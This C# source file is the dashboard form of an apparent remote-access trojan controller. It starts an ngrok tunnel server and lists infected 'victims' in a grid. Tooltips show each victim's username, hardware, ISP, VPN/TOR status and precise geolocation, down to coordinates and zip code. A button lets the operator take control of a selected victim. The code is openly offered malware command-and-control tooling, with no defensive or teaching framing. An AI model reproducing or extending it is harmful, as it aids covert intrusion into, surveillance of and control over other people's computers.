using System;
using System.IO;
using System.Drawing;
using Controller.Codes;
using Controller.Server;
using Controller.Popups;
using System.Windows.Forms;
using System.ComponentModel;
using Controller.Properties;
using Controller.ActionClass;
using System.Collections.Generic;
using Syncfusion.WinForms.Controls;
using Syncfusion.WinForms.Controls.Enums;
using Syncfusion.WinForms.DataGrid.Events;
using Syncfusion.WinForms.Controls.Styles;

namespace Controller
{
    public partial class Dashboard : SfForm
    {
        private TaskPreviewer TPInst = null;

        public Dashboard()
        {
            InitializeComponent();
            TargetV.Initialize(dgVictims);
            Directory.CreateDirectory(SUtils.WorkDir);
            SUtils.OnInternetChanged += OnInternetChanged;
            SUtils.OnDoUIEvents += OnDoUIEvents;
            SUtils.SetInitials(this);
            EnforceExtraDesigns();

            lpCommandStatus.Text = "Ready For Actions!";
            if (File.Exists(SUtils.WorkDir + "Close.Detect")) { /* [To-Do] Display crash report*/ }
            else File.WriteAllText(SUtils.WorkDir + "Close.Detect", "-");

            //////////
            btSettings.Click += (o, e) => { new Dummy { DummyStr = "Hey Dumb, I am Wor-King!!" }.
                ExecuteCMD("Dummy", TaskConst.Connect, btSettings.SetFuture(new { Text = "Done" }, "Doing..")); };
        }

        #region Overrides + Extras

        private void EnforceExtraDesigns()
        {
            dgVictims.Columns[2].MinimumWidth += 12;
            tcMain.InactiveTabColor = Color.Thistle;
            tcMain.ActiveTabColor = Color.FromArgb(85, 20, 35);
            tcMain.InActiveTabForeColor = Color.FromArgb(44, 0, 0);
            tcMain.ActiveTabForeColor = Color.FromArgb(255, 225, 155);
            dgVictims.Style.ButtonStyle.BackColor = Color.FromArgb(235, 235, 118);
            dgVictims.Style.ButtonStyle.HoverBackColor = Color.FromArgb(255, 255, 128);
        }

        private void OnInternetChanged(bool IsConnected)
        {
            if (!IsConnected) TargetV.VictimList.Clear();
            lpConnectionStatus.SInvoke((C) => C.Text = IsConnected ? "ONLINE" : "OFFLINE");
            pbpConStatus.SInvoke((C) => C.Image = IsConnected ? Resources.Online : Resources.Offline);
            lpConnectionStatus.SInvoke((C) => C.ForeColor = IsConnected ? Color.DarkGreen : Color.Maroon);
        }

        protected override void WndProc(ref Message WinMSG)
        {
            int WM_MOVING = 0x216;

            if (WinMSG.Msg == WM_MOVING) //Prevent moving out off the screen bounds
            {
                Rectangle RRead = Rectangle.FromLTRB(System.Runtime.InteropServices.Marshal.ReadInt32(WinMSG.LParam, 0), System.Runtime.InteropServices.Marshal.ReadInt32(WinMSG.LParam, 4), System.Runtime.InteropServices.Marshal.ReadInt32(WinMSG.LParam, 8), System.Runtime.InteropServices.Marshal.ReadInt32(WinMSG.LParam, 12));
                Rectangle RAllowed = Rectangle.FromLTRB(0, 0, SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);

                if (RRead.Left <= RAllowed.Left || RRead.Top <= RAllowed.Top || RRead.Right >= RAllowed.Right || RRead.Bottom >= RAllowed.Bottom)
                {
                    int Off_X = RRead.Left < RAllowed.Left ? (RAllowed.Left - RRead.Left) : (RRead.Right > RAllowed.Right ? (RAllowed.Right - RRead.Right) : (0));
                    int Off_Y = RRead.Top < RAllowed.Top ? (RAllowed.Top - RRead.Top) : (RRead.Bottom > RAllowed.Bottom ? (RAllowed.Bottom - RRead.Bottom) : (0));
                    RRead.Offset(Off_X, Off_Y);
                    System.Runtime.InteropServices.Marshal.WriteInt32(WinMSG.LParam, 0, RRead.Left);
                    System.Runtime.InteropServices.Marshal.WriteInt32(WinMSG.LParam, 4, RRead.Top);
                    System.Runtime.InteropServices.Marshal.WriteInt32(WinMSG.LParam, 8, RRead.Right);
                    System.Runtime.InteropServices.Marshal.WriteInt32(WinMSG.LParam, 12, RRead.Bottom);
                }
            }

            base.WndProc(ref WinMSG);
        }

        protected override async void OnLoad(EventArgs args)
        {
            await ServerManager.StartNGROK();
            base.OnLoad(args);
        }

        protected override void OnClosing(CancelEventArgs CEArgs)
        {
            CEArgs.Cancel = true;
            ServerManager.OnEnding();
            if (File.Exists(SUtils.WorkDir + "Close.Detect"))
                    File.Delete(SUtils.WorkDir + "Close.Detect");
            Environment.Exit(0);
            return;
        }

        #endregion

        #region Main UI Works

        private void OnDoUIEvents(string EType, object Data = null)
        {
            switch (EType)
            {
                case "BTN-SvrClick": btStartSvr.SInvoke((C) => C.PerformClick()); break;
                case "DGVictim-UnSelect": dgVictims.SInvoke((C) => C.ClearSelection()); break;
                case "UP-Lat": lpLatencyPing.SInvoke((C) => C.Text = $"{Data}"); break;
            }
        }

        private void lpActiveTasks_Click(object _, EventArgs __)
        {
            if (Tasker.CompletedTasks.Count() > 0 || Tasker.PendingTasks.Count() > 0)
            {
                if (TPInst == null || TPInst.IsDisposed)
                {
                    TPInst = new TaskPreviewer
                        (new Point(Location.X + (Width / 2) - 307,
                        Location.Y + (Height / 2) + 245));
                    TPInst.Show(this);
                }
                else if (TPInst.IsHandleCreated) TPInst.WindowState = 0;
                else
                {
                    try { TPInst.Dispose(); } catch { }
                    TPInst = null;
                    lpActiveTasks_Click(null, null);
                }
            }
            else MessageBox.Show("No tasks are available to display!");
        }

        private async void btStartSvr_Click(object _, EventArgs __)
        {
            long FId;
            if (!ServerManager.IsServerRunning)
                FId = btStartSvr.SetFuture(new { Text = "Stop Server", BackColor = Color.LightPink }, "Starting...");
            else FId = btStartSvr.SetFuture(new { Text = "Start Server", BackColor = Color.LightGreen }, "Stopping...");
            FutureUI.UpdateFuture(FId, await ServerManager.SwitchServerMode());
        }

        private void DgVictims_ToolTipOpening(object _, ToolTipOpeningEventArgs TTOEArgs)
        {
            var CI = TTOEArgs.ColumnIndex;
            if (CI == 0 || CI == 2 || CI == 5) TTOEArgs.Cancel = true;
            else
            {
                var TTip = TTOEArgs.ToolTipInfo;
                var VInfos = (Victim)TTOEArgs.Record;
                var TItems = new List<ToolTipItem>();
                var TVisualS = new ToolTipVisualStyle();

                TTip.Items.Clear();
                TTip.MaxWidth = 500;
                TTip.MinWidth = 100;
                TTip.BorderThickness = 2;
                TTip.BorderColor = Color.LightBlue;
                TTip.BeakBackColor = Color.SkyBlue;
                TTip.ToolTipStyle = ToolTipStyle.Balloon;
                TTip.ToolTipLocation = ToolTipLocation.BottomCenter;

                TVisualS.BackColor = Color.OldLace;
                TVisualS.ForeColor = Color.FromArgb(15, 50, 30);
                TVisualS.Font = new Font("Palatino Linotype", 9F, FontStyle.Bold) { };

                switch (CI)
                {
                    case 1:

                        TItems.Add(new ToolTipItem { Text = $"User Name => {VInfos.PCDet.UserName}" });
                        TItems.Add(new ToolTipItem { Text = $"OS Type => {(VInfos.PCDet.IsOS64Bit ? "64 Bit" : "32 Bit")}" });
                        TItems.Add(new ToolTipItem { Text = $"Total Drives => {VInfos.PCDet.DriveCount}" });
                        TItems.Add(new ToolTipItem { Text = $"Total Processors => {VInfos.PCDet.ProcessorCount}" });
                        TItems.Add(new ToolTipItem { Text = $"Total Storage => {VInfos.PCDet.TotalSize}" });
                        TItems.Add(new ToolTipItem { Text = $"Free Space Left => {VInfos.PCDet.RemainingSize}" });
                        TItems.Add(new ToolTipItem { Text = $"OS Name => {VInfos.PCDet.OSName}" });
                        break;

                    case 3:

                        var LD = VInfos.LocDet;
                        TItems.Add(new ToolTipItem { Text = $"IP Type => {(LD.IsMobile ? "Mobile Network" : LD.IsHosting ? "Datacenter(Hosting) Network" : LD.IsProxy ? "Proxied(VPN Or TOR) Network" : "Unknown Network")}" });
                        TItems.Add(new ToolTipItem { Text = $"ISP => {LD.ISP}" });
                        break;

                    case 4:

                        var Loc = VInfos.LocDet;
                        TItems.Add(new ToolTipItem { Text = $"Continent => {Loc.Continent}" });
                        TItems.Add(new ToolTipItem { Text = $"Country => {Loc.Country}" });
                        TItems.Add(new ToolTipItem { Text = $"Region => {Loc.RegionName}" });
                        TItems.Add(new ToolTipItem { Text = $"City => {Loc.City}" });
                        TItems.Add(new ToolTipItem { Text = $"Currency => {Loc.Currency}" });
                        TItems.Add(new ToolTipItem { Text = $"Timezone => {Loc.Timezone}" });
                        TItems.Add(new ToolTipItem { Text = $"Longitude[Point] => {Loc.Longitude}" });
                        TItems.Add(new ToolTipItem { Text = $"Latitude[Point] => {Loc.Latitude}" });
                        TItems.Add(new ToolTipItem { Text = $"Area Zip => {Loc.Zip}" });
                        break;

                    case 6:

                        TItems.Add(new ToolTipItem { Text = VInfos.ToggleStatus == "Controlling" ? "You Are Controlling This Victim!" : "Click The Button To Control This Victim." });
                        break;
                }

                foreach (var TTI in TItems) { TTI.Style = TVisualS; TTI.EnableSeparator = true; }
                TTip.Items.AddRange(TItems.ToArray());
            }
        }

        private void DgVictims_CellButtonClick(object _, CellButtonClickEventArgs CBCArgs)
        {
            var VInfos = (Victim)((Syncfusion.WinForms.DataGrid.DataRow)CBCArgs.Record).RowData;
            if (VInfos.ToggleStatus == "Controlling" || VInfos.ToggleStatus == "Activating....") return;

            VInfos.ToggleStatus = "Activating....";
            VInfos.Activate(VInfos.SetFuture(new { ToggleStatus = "Controlling" }));
        }

        #endregion
    }

    public static class UIExtensions
    {
        public static void SInvoke<T>(this T CToInvoke, Action<T> IAct) where T : Control
        {
            if (!CToInvoke.IsDisposed && CToInvoke.IsHandleCreated)
            {
                if (CToInvoke.InvokeRequired)
                    CToInvoke.Invoke(new Action<T, Action<T>>(SInvoke), new object[] { CToInvoke, IAct });
                else IAct(CToInvoke);
            }
        }
    }
}
